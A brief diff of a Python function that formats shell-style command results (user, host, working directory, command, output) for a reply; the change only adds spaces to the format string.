@@ -8,7 +8,7 @@ import os
 def send_reply(server, message, reply):
     text = ""
     for item in reply:
-        text += "{user}@{machine}:{pwd}$ {cmd}\r\n{out}\r\n".format(
+        text += "{user}@{machine}:{pwd}$ {cmd} \r\n {out} \r\n ".format(
                 user=getpass.getuser(),
                 machine=platform.node(),
                 pwd=os.getcwd(),
